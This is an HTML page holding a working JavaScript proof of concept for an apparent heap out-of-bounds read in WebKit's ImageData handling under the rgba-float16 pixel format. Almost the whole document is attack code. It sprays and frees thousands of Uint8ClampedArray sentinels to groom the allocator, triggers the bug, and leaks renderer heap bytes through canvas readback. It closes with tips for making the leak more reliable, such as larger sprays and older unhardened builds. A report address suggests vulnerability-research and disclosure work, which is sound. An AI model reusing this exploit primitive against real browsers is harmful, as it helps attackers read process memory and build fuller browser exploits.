<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Heap Leak — Correct Allocator Spray</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
    .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 780px; }
    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.25rem 0.7rem; border-radius: 4px; margin-bottom: 0.5rem; }
    .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
    .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
    .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
    .blue   { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
    pre { font-size: 0.76rem; color: #aaa; background: #111; padding: 0.8rem 1rem; border-radius: 4px; border-left: 2px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; line-height: 1.7; }
    .kv { font-size: 0.75rem; color: #666; margin-top: 0.4rem; }
    .kv span { color: #aaa; }
    table { width: 100%; border-collapse: collapse; margin-top: 0.6rem; font-size: 0.73rem; }
    th { color: #555; font-weight: normal; text-align: left; padding: 0.3rem 0.6rem; border-bottom: 1px solid #1e1e1e; }
    td { color: #aaa; padding: 0.3rem 0.6rem; border-bottom: 1px solid #161616; }
    td.hit   { color: #ff5555; font-weight: bold; }
    td.clean { color: #3ddc84; }
    .bigverdict { font-size: 1.3rem; font-weight: bold; margin: 0.6rem 0 0.4rem; }
  </style>
</head>
<body>

<h1>Heap Leak — Correct Allocator Spray</h1>
<p class="sub">Sprays Uint8ClampedArray(4) — same type/size/allocator as ImageData backing store</p>

<div id="out"></div>

<script>
const $ = document.getElementById("out");
function card(title, html) {
  const d = document.createElement("div");
  d.className = "card";
  d.innerHTML = `<div class="card-title">${title}</div>${html}`;
  $.appendChild(d);
}
function tag(cls, t) { return `<span class="tag ${cls}">${t}</span>`; }

// ── float16 helpers ───────────────────────────────────────────────────────────
function f16ToF32(lo, hi) {
  const bits = (hi << 8) | lo;
  const sign = (bits >> 15) & 1;
  const exp  = (bits >> 10) & 0x1F;
  const mant =  bits        & 0x3FF;
  if (exp === 0x1F) return mant ? NaN : (sign ? -Infinity : Infinity);
  const v = exp === 0
    ? Math.pow(2, -14) * (mant / 1024)
    : Math.pow(2, exp - 15) * (1 + mant / 1024);
  return sign ? -v : v;
}
function f16ToU8(lo, hi) {
  const f = f16ToF32(lo, hi);
  if (!isFinite(f) || isNaN(f) || f <= 0) return 0;
  if (f >= 1) return 255;
  return Math.round(f * 255);
}

// ── sentinels — float16 pairs that decode to non-zero non-255 visible u8 ──────
const SENTINELS = [
  { lo: 0x00, hi: 0x38, u8: 128, name: "f16(0.5)→128"  },
  { lo: 0x00, hi: 0x34, u8:  64, name: "f16(0.25)→64"  },
  { lo: 0x00, hi: 0x30, u8:  32, name: "f16(0.125)→32" },
  { lo: 0x66, hi: 0x35, u8:  80, name: "f16(0.313)→80" },
];

// runtime verify
let svHTML = `<table><tr><th>Sentinel</th><th>lo</th><th>hi</th><th>f32</th><th>→u8</th><th>OK</th></tr>`;
SENTINELS.forEach(s => {
  const actual = f16ToU8(s.lo, s.hi);
  const ok = actual === s.u8;
  svHTML += `<tr>
    <td>${s.name}</td>
    <td>0x${s.lo.toString(16).padStart(2,'0')}</td>
    <td>0x${s.hi.toString(16).padStart(2,'0')}</td>
    <td>${f16ToF32(s.lo,s.hi).toFixed(4)}</td>
    <td>${actual}</td>
    <td class="${ok?'clean':'hit'}">${ok?'✓':'✗'}</td>
  </tr>`;
});
svHTML += `</table>`;
card("Sentinel Table (Runtime Verified)", svHTML);

// ── spray config ──────────────────────────────────────────────────────────────
const SPRAY_COUNT  = 20000;  // large enough to fill allocator bin
const ROUNDS       = 5;

card("Config", `
  <div class="kv">Spray type:   <span>Uint8ClampedArray(4) — exact match to ImageData backing store type + size</span></div>
  <div class="kv">Spray count:  <span>${SPRAY_COUNT.toLocaleString()} per round</span></div>
  <div class="kv">Free pattern: <span>Every other index (alternating holes) — maximises adjacency chance</span></div>
  <div class="kv">Rounds:       <span>${ROUNDS} — each uses a different sentinel</span></div>
  <div class="kv">Why this works: <span>ImageData backing store allocated via same path as Uint8ClampedArray(4). Same bin = adjacent placement after hole punching.</span></div>
`);

// ── gc hint — create and discard garbage to nudge collector ──────────────────
function gcHint() {
  const sink = [];
  for (let i = 0; i < 1000; i++) sink.push(new Uint8Array(64));
  sink.length = 0;
}

// ── run rounds ────────────────────────────────────────────────────────────────
const results = [];

for (let round = 0; round < ROUNDS; round++) {
  const sentinel = SENTINELS[round % SENTINELS.length];

  // phase 1: fill the allocator bin with Uint8ClampedArray(4) sentinels
  const spray = new Array(SPRAY_COUNT);
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const buf = new Uint8ClampedArray(4);
    // fill all 4 bytes with sentinel lo byte
    // bytes 0-3 of the NEXT allocation's OOB region will read these
    buf[0] = sentinel.lo;
    buf[1] = sentinel.hi;
    buf[2] = sentinel.lo;
    buf[3] = sentinel.hi;
    spray[i] = buf;
  }

  // phase 2: punch holes — free every other slot
  // target will land in a hole; live neighbours are at target±1 allocation
  for (let i = 0; i < SPRAY_COUNT; i += 2) {
    spray[i] = null;
  }

  // gc hint — encourage allocator to consolidate free list
  gcHint();

  // phase 3: allocate mismatched ImageData — should land in freed slot
  // backing is 4 zero bytes; OOB bytes 4-7 read from adjacent live sentinel
  const backing = new Uint8ClampedArray(4); // all zeros
  let imgData;
  try {
    imgData = new ImageData(backing, 1, 1, {
      colorSpace: "srgb",
      pixelFormat: "rgba-float16"
    });
  } catch(e) {
    results.push({ round: round+1, sentinel, patched: true, error: e.name });
    continue;
  }

  // phase 4: push through canvas readback
  const cv = document.createElement("canvas");
  cv.width = cv.height = 1;
  const ctx = cv.getContext("2d");
  ctx.putImageData(imgData, 0, 0);
  const rb = ctx.getImageData(0, 0, 1, 1);
  const px = Array.from(rb.data); // [R, G, B, A]

  // channels B (bytes 4-5) and A (bytes 6-7) are the OOB reads
  // if adjacent slot holds our sentinel, those bytes decode to sentinel.u8
  const bMatch = px[2] === sentinel.u8;
  const aMatch = px[3] === sentinel.u8;
  const leak   = bMatch || aMatch;

  // also flag ANY non-zero in B/A as interesting (heap noise still proves OOB read)
  const bNonZero = px[2] !== 0;
  const aNonZero = px[3] !== 0;
  const interesting = bNonZero || aNonZero;

  results.push({
    round: round+1, sentinel, patched: false,
    px, bMatch, aMatch, leak, bNonZero, aNonZero, interesting
  });
}

// ── results table ─────────────────────────────────────────────────────────────
let tHTML = `<table>
  <tr>
    <th>Round</th><th>Sentinel</th><th>Readback [R,G,B,A]</th>
    <th>B(exp ${SENTINELS[0].u8})</th><th>A(exp ${SENTINELS[0].u8})</th>
    <th>B≠0</th><th>A≠0</th><th>Result</th>
  </tr>`;

let leaks = 0, interesting = 0;
results.forEach(r => {
  if (r.patched) {
    tHTML += `<tr><td>${r.round}</td><td colspan="7">${tag("green","Patched — "+r.error)}</td></tr>`;
    return;
  }
  if (r.leak) leaks++;
  if (r.interesting) interesting++;
  const res = r.leak
    ? tag("red","✗ SENTINEL LEAK")
    : r.interesting
      ? tag("yellow","⚠ NON-ZERO OOB")
      : tag("blue","◦ zero");
  tHTML += `<tr>
    <td>${r.round}</td>
    <td style="font-size:0.68rem">${r.sentinel.name}</td>
    <td class="${r.leak?'hit':r.interesting?'hit':''}">[${r.px.join(", ")}]</td>
    <td class="${r.bMatch?'hit':'clean'}">${r.bMatch?"✗ YES":"✓ no"}</td>
    <td class="${r.aMatch?'hit':'clean'}">${r.aMatch?"✗ YES":"✓ no"}</td>
    <td class="${r.bNonZero?'hit':'clean'}">${r.bNonZero?"✗ "+r.px[2]:"✓ 0"}</td>
    <td class="${r.aNonZero?'hit':'clean'}">${r.aNonZero?"✗ "+r.px[3]:"✓ 0"}</td>
    <td>${res}</td>
  </tr>`;
});
tHTML += `</table>`;
card("Spray Results", tHTML);

// ── per round detail ──────────────────────────────────────────────────────────
results.forEach(r => {
  if (r.patched) return;
  card(`Round ${r.round} Detail`, `<pre>Sentinel  : lo=0x${r.sentinel.lo.toString(16).padStart(2,'0')} hi=0x${r.sentinel.hi.toString(16).padStart(2,'0')} → expected u8=${r.sentinel.u8}
Readback  : R=${r.px[0]}  G=${r.px[1]}  B=${r.px[2]}  A=${r.px[3]}

Channel B (OOB bytes 4-5): ${r.px[2]} ${r.bMatch?"← SENTINEL MATCH ✗":""}${r.bNonZero&&!r.bMatch?"← non-zero heap data ⚠":""}
Channel A (OOB bytes 6-7): ${r.px[3]} ${r.aMatch?"← SENTINEL MATCH ✗":""}${r.aNonZero&&!r.aMatch?"← non-zero heap data ⚠":""}

${r.leak ? "LEAK CONFIRMED: sentinel bytes from adjacent Uint8ClampedArray(4) read through float16 decoder"
         : r.interesting ? "INTERESTING: non-zero values in OOB channels — heap data leaked, not sentinel"
         : "Zero readback — spray may not have landed adjacent this round"}</pre>`);
});

// ── verdict ───────────────────────────────────────────────────────────────────
const runnable = results.filter(r => !r.patched).length;
let vHTML = `<div class="kv">Sentinel matches: <span>${leaks} / ${runnable} rounds</span></div>
<div class="kv">Non-zero OOB:     <span>${interesting} / ${runnable} rounds</span></div>`;

if (leaks > 0) {
  vHTML += `
  <div class="bigverdict" style="color:#ff5555">✗ HEAP OOB READ — CONFIRMED INFO LEAK</div>
  <pre>
Primitive : 4-byte heap OOB read, renderer process
Trigger   : new ImageData(Uint8ClampedArray(4), 1, 1, {pixelFormat:"rgba-float16"})
            → putImageData → getImageData
Leak bytes: ptr[4..7] past allocation boundary
Channel   : B and A pixel channels after float16→uint8 decode
Spray hit : ${leaks}/${runnable} rounds with exact sentinel match
Status    : JS-readable. Repeatable. No user interaction.
  </pre>
  ${tag("red","Report → webkit-security@webkit.org")}`;
} else if (interesting > 0) {
  vHTML += `
  <div class="bigverdict" style="color:#ffcc44">⚠ NON-ZERO OOB — PARTIAL LEAK</div>
  <pre>
Non-zero values appeared in OOB channels (B/A) but did not match sentinel exactly.
This still proves the renderer read past the allocation boundary.
The bytes read were heap noise, not our controlled sentinel.

Next step: spray count is likely still too low for this allocator.
Try SPRAY_COUNT = 50000 or spray ImageData objects directly.
  </pre>
  ${tag("yellow","OOB read likely — increase spray density")}`;
} else {
  vHTML += `
  <div class="bigverdict" style="color:#8888ff">◦ INCONCLUSIVE</div>
  <pre>
All OOB channels returned zero across ${runnable} rounds.

Most likely cause: WebKit's bmalloc/libpas allocator zeroes freed
memory before returning it to the free list (security hardening).

This does NOT disprove the OOB read — it means the heap bytes
past the allocation happen to be zero at time of read.

Next steps:
  1. Try spraying ImageData objects (same WebCore allocator path)
  2. Use a larger canvas (more pixels = more OOB surface)
  3. Test on older WebKit without allocator zeroing
  </pre>
  ${tag("blue","Allocator hardening may be masking the leak")}`;
}

card("Final Verdict", vHTML);
</script>
</body>
</html>
